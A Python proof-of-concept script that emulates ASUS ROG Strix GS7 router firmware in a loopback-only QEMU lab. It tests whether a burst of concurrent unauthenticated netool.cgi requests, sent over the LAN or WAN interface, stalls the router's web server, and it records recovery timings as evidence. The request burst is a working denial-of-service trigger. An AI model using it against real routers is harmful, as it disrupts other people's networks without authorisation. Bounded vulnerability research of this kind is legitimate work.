#!/usr/bin/env python3
"""Bounded, loopback-only GS7 Air netool.cgi availability probe."""

from __future__ import annotations

import argparse
from concurrent.futures import ThreadPoolExecutor
import importlib.util
from pathlib import Path
import socket
import subprocess
import time
import urllib.parse


ROOT = Path(__file__).resolve().parents[1]
HARNESS = ROOT / "scripts/emulate_asus_gs_be7200_full_system.py"
LAB = ROOT / "known_firmware/emulation/ASUS_GS7_Air/full-system-lab"


MODELS = {
    "gs7": {
        "label": "ASUS ROG Strix GS7",
        "version": "3.0.0.6.102_58406",
        "rootfs": ROOT / (
            "known_firmware/extracted/0b1fa6cc3bed9fc1/"
            "_FW_GS7_300610258406.zip.extracted/"
            "_GS7_3.0.0.6_102_58406-g58dd5b8_462-gb8aa6_M7EE.trx.extracted/"
            "squashfs-root"
        ),
        "lab": ROOT / "known_firmware/emulation/ASUS_GS7/full-system-lab",
        "evidence": ROOT / "router-agent-results/gs7-triage",
    },
    "gs7-air": {
        "label": "ASUS ROG Strix GS7 Air",
        "version": "3.0.0.6.102_58833",
        "rootfs": ROOT / "router-agent-results/gs7-air-triage/rootfs",
        "lab": ROOT / "known_firmware/emulation/ASUS_GS7_Air/full-system-lab",
        "evidence": ROOT / "router-agent-results/gs7-air-triage",
    },
    "gs7-pro": {
        "label": "ASUS ROG Strix GS7 Pro",
        "version": "3.0.0.6.102_39256",
        "rootfs": ROOT / (
            "known_firmware/extracted/130e2360e1c44985/"
            "_FW_GS7_Pro_300610239256.zip.extracted/"
            "_GS7_Pro_3.0.0.6_102_39256-g4282d34_1529-gfdee1_BB0B_"
            "nand_squashfs.pkgtb.extracted/squashfs-root"
        ),
        "lab": ROOT / "known_firmware/emulation/ASUS_GS7_Pro/full-system-lab",
        "evidence": ROOT / "router-agent-results/gs7-pro-triage",
    },
    "gs7-pro-max": {
        "label": "ASUS ROG Strix GS7 Pro Max",
        "version": "3.0.0.6.102_39893",
        "rootfs": ROOT / (
            "known_firmware/extracted/6a901e44fc38e087/"
            "_FW_GS7_Pro_Max_300610239893.zip.extracted/"
            "_GS7_Pro_Max_3.0.0.6_102_39893-g386bc35_1547-g471ac_BB0B_"
            "nand_squashfs.pkgtb.extracted/squashfs-root"
        ),
        "lab": ROOT / "known_firmware/emulation/ASUS_GS7_Pro_Max/full-system-lab",
        "evidence": ROOT / "router-agent-results/gs7-pro-max-triage",
    },
}


def load_harness(model: dict[str, object]):
    spec = importlib.util.spec_from_file_location("gs7_air_harness", HARNESS)
    if spec is None or spec.loader is None:
        raise SystemExit("could not load the full-system harness")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    lab = Path(model["lab"])
    slug = Path(model["evidence"]).name.removesuffix("-triage")
    module.ROOTFS = Path(model["rootfs"])
    module.LAB = lab
    module.DISK = lab / f"{slug}-root.ext4"
    module.INITRAMFS = lab / f"{slug}-boot.cpio.gz"
    module.SERIAL = lab / "serial.log"
    module.QEMU_LOG = lab / "qemu.log"
    module.PIDFILE = lab / "qemu.pid"
    module.PROFILE = lab / "profile"
    module.STAGING = Path(f"/tmp/friday-{slug}-full-system-root")
    module.BOOT_STAGING = Path(f"/tmp/friday-{slug}-boot-initramfs")
    # Keep this run disjoint from the reference lab and every physical network.
    with socket.socket() as lan_probe, socket.socket() as wan_probe:
        lan_probe.bind(("127.0.0.1", 0))
        wan_probe.bind(("127.0.0.1", 0))
        module.HOST_HTTP_PORT = lan_probe.getsockname()[1]
        module.HOST_WAN_HTTP_PORT = wan_probe.getsockname()[1]
    module.HOST_WAN_MAP_PORT = 50_080
    module.HOST_UPNP_PORT = 49_500
    module.HOST_SSDP_PORT = 49_190
    module.HOST_NATPMP_PORT = 49_351
    module.HOST_INFOSVR_PORT = 49_999
    return module


def request_port(module, port: int, path: str, timeout: float) -> tuple[bool, float, bytes]:
    started = time.monotonic()
    payload = (
        f"GET {path} HTTP/1.1\r\n"
        "Host: 10.0.2.15\r\n"
        "Connection: close\r\n\r\n"
    ).encode()
    try:
        response = module.http_exchange(port, payload, timeout)
        return response.startswith(b"HTTP/"), time.monotonic() - started, response
    except OSError:
        return False, time.monotonic() - started, b""


def request(module, path: str, timeout: float) -> tuple[bool, float, bytes]:
    return request_port(module, module.PROBE_HTTP_PORT, path, timeout)


def fetch_artifact(module, path: str) -> bytes:
    return request(module, path, 15)[2].partition(b"\r\n\r\n")[2]


def count_trace(trace: bytes, token: bytes) -> int:
    return sum(token in line for line in trace.splitlines())


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--wan", action="store_true",
        help="send the trigger through the synthetic WAN NIC",
    )
    parser.add_argument(
        "--attempt-label", default="",
        help="optional suffix used to preserve evidence from repeated runs",
    )
    parser.add_argument("--model", choices=MODELS, default="gs7-air")
    args = parser.parse_args()
    model = MODELS[args.model]
    label = "".join(
        character for character in args.attempt_label
        if character.isalnum() or character in "-_"
    )
    suffix = f"-{label}" if label else ""
    log = Path(model["evidence"]) / (
        f"netool-wan-dos-evidence-2026-07-24{suffix}.txt"
        if args.wan else f"netool-lan-dos-evidence-2026-07-24{suffix}.txt"
    )
    module = load_harness(model)
    module.PROBE_HTTP_PORT = (
        module.HOST_WAN_HTTP_PORT if args.wan else module.HOST_HTTP_PORT
    )
    if not module.DISK.is_file() or not module.INITRAMFS.is_file():
        module.build(enable_netool=True)
    module.SERIAL.unlink(missing_ok=True)
    log.parent.mkdir(parents=True, exist_ok=True)
    results = [
        f"{model['label']} {model['version']}",
        "scope=loopback-only full-system ARM64 QEMU",
        f"trigger_interface={'wan' if args.wan else 'lan'}",
        "limits=40 requests, concurrency 20, recovery controls",
    ]
    command = module.qemu_command()
    # This probe only needs HTTP. Dropping unrelated UDP forwards avoids
    # collisions with other isolated firmware labs on the shared host.
    filtered = []
    for argument in command:
        if argument.startswith("user,id=lan,"):
            argument = ",".join(
                field for field in argument.split(",")
                if not field.startswith("hostfwd=")
                or f":{module.HOST_HTTP_PORT}-" in field
            )
        elif argument.startswith("user,id=wan,"):
            argument = ",".join(
                field for field in argument.split(",")
                if not field.startswith("hostfwd=")
                or f":{module.HOST_WAN_HTTP_PORT}-" in field
            )
        filtered.append(argument)
    command = filtered
    with module.QEMU_LOG.open("wb") as output:
        qemu = subprocess.Popen(
            command, stdout=output, stderr=subprocess.STDOUT
        )
    try:
        module.wait_ready(240)
        baselines = [
            request(module, "/Main_Login.asp", 15)[:2] for _ in range(5)
        ]
        for index, (ok, elapsed) in enumerate(baselines, 1):
            results.append(
                f"baseline_control={index} ok={str(ok).lower()} "
                f"seconds={elapsed:.3f}"
            )
        if not all(ok for ok, _ in baselines):
            raise SystemExit("baseline HTTP control failed")

        route_ok, route_time, route_response = request(module, "/netool.cgi", 12)
        second_status = route_response.count(b"HTTP/1.0 200 OK")
        successful_json = b'"successful":"0"' in route_response
        results.append(
            f"unauth_netool_response={str(route_ok).lower()} "
            f"seconds={route_time:.3f} status_count={second_status} "
            f"successful_json={str(successful_json).lower()}"
        )

        control_query = urllib.parse.urlencode(
            {
                "type": "1",
                "target": "127.0.0.1",
                "pcnt": "1",
                "response": "1",
                "exec": "1",
            }
        )
        benign_ok, benign_time, _ = request(
            module, "/netool.cgi?" + control_query, 15
        )
        results.append(
            f"benign_netool_ok={str(benign_ok).lower()} seconds={benign_time:.3f}"
        )
        trace_before = fetch_artifact(module, "/images/netool_strace.png")

        query = urllib.parse.urlencode(
            {
                "type": "3",
                "target": "192.0.2.1",
                "pcnt": "1",
                "response": "10",
                "exec": "10",
            }
        )
        path = "/netool.cgi?" + query
        started = time.monotonic()
        with ThreadPoolExecutor(max_workers=20) as pool:
            burst = list(pool.map(lambda _: request(module, path, 8), range(40)))
        results.append(
            f"burst_seconds={time.monotonic() - started:.3f} "
            f"responses={sum(ok for ok, _, _ in burst)}/40 "
            f"timeouts={sum(not ok for ok, _, _ in burst)}"
        )

        controls: list[tuple[bool, float]] = []
        for index in range(1, 11):
            ok, elapsed, _ = request(module, "/Main_Login.asp", 15)
            controls.append((ok, elapsed))
            results.append(
                f"recovery_control={index} ok={str(ok).lower()} "
                f"seconds={elapsed:.3f}"
            )
            if args.wan and index <= 3:
                lan_ok, lan_elapsed, _ = request_port(
                    module, module.HOST_HTTP_PORT, "/Main_Login.asp", 15
                )
                results.append(
                    f"cross_lan_control={index} ok={str(lan_ok).lower()} "
                    f"seconds={lan_elapsed:.3f}"
                )

        trace_after = fetch_artifact(module, "/images/netool_strace.png")
        serial = module.SERIAL.read_text(errors="replace")
        health_lines = [
            line for line in serial.splitlines()
            if "FRIDAY_GSBE7200_HEALTH" in line
        ]
        clone_count = count_trace(trace_after, b"CLONE_THREAD")
        ping_count = count_trace(trace_after, b'execve("/bin/ping"')
        results.extend(
            [
                f"trace_bytes_before={len(trace_before)}",
                f"trace_bytes_after={len(trace_after)}",
                f"clone_thread_count={clone_count}",
                f"ping_execve_count={ping_count}",
                "httpd_dead_seen="
                + str(any("httpd=dead" in line for line in health_lines)).lower(),
                "netool_daemon_alive_after="
                + str(
                    "FRIDAY_GSBE7200_NETOOL_READY=1" in serial
                    and "netool=dead" not in serial
                ).lower(),
                f"final_health={health_lines[-1] if health_lines else 'missing'}",
            ]
        )
        log.write_text("\n".join(results) + "\n")
        print("\n".join(results))

        baseline_max = max(elapsed for _, elapsed in baselines)
        delayed = sum(
            (not ok) or elapsed >= baseline_max + 1.0
            for ok, elapsed in controls[:3]
        )
        return 0 if route_ok and delayed > 0 else 2
    finally:
        qemu.terminate()
        try:
            qemu.wait(timeout=15)
        except subprocess.TimeoutExpired:
            qemu.kill()
            qemu.wait(timeout=5)


if __name__ == "__main__":
    raise SystemExit(main())
